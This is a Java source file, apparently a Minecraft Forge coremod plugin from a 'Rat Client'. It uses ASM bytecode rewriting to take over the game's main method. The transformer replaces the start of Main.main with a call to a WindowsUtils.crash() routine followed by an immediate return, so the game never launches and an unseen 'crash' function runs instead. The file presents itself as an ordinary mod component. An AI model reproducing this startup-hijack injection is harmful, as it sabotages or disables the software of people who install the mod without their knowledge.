package me.sleepyfish.rat;

import org.objectweb.asm.*;

import net.minecraft.launchwrapper.IClassTransformer;

import net.minecraftforge.fml.relauncher.IFMLLoadingPlugin;

import java.util.Map;

/**
 * This class is from Rat Client.
 * WARNING: Unauthorized reproduction, skidding, or decompilation of this code is strictly prohibited.
 * @author Nexuscript 2024
 */
@IFMLLoadingPlugin.TransformerExclusions("me/sleepyfish/rat")
public class ModLoadingPlugin implements IFMLLoadingPlugin {

    @Override
    public String[] getASMTransformerClass() {
        return new String[]{MainMethodTransformer.class.getName()};
    }

    @Override
    public String getModContainerClass() {
        return null;
    }

    @Override
    public String getSetupClass() {
        return null;
    }

    @Override
    public void injectData(Map<String, Object> data) {
    }

    @Override
    public String getAccessTransformerClass() {
        return null;
    }

    static class MainMethodInjector extends ClassVisitor {

        public MainMethodInjector(ClassVisitor cv) {
            super(Opcodes.ASM5, cv);
        }

        @Override
        public MethodVisitor visitMethod(int access, String name, String desc, String signature, String[] exceptions) {
            MethodVisitor mv = super.visitMethod(access, name, desc, signature, exceptions);

            if ("main".equals(name) && "([Ljava/lang/String;)V".equals(desc))
                mv = new InjectMainMethodVisitor(mv);

            return mv;
        }

        private static class InjectMainMethodVisitor extends MethodVisitor {
            public InjectMainMethodVisitor(MethodVisitor mv) {
                super(Opcodes.ASM5, mv);
            }

            @Override
            public void visitCode() {
                this.mv.visitCode();
                this.mv.visitVarInsn(Opcodes.ALOAD, 0);
                this.mv.visitMethodInsn(Opcodes.INVOKESTATIC, "me/sleepyfish/rat/WindowsUtils", "crash", "()V", false);
                this.mv.visitInsn(Opcodes.RETURN);
            }
        }
    }

    static class MainMethodTransformer implements IClassTransformer {
        @Override
        public byte[] transform(String name, String transformedName, byte[] basicClass) {
            if ("net/minecraft/client/main/Main".equals(transformedName))
                return transformMainClass(basicClass);

            return basicClass;
        }

        private byte[] transformMainClass(byte[] bytes) {
            ClassReader reader = new ClassReader(bytes);
            ClassWriter writer = new ClassWriter(ClassWriter.COMPUTE_MAXS | ClassWriter.COMPUTE_FRAMES);
            ClassVisitor visitor = new MainMethodInjector(writer);
            reader.accept(visitor, 0);
            return writer.toByteArray();
        }
    }

}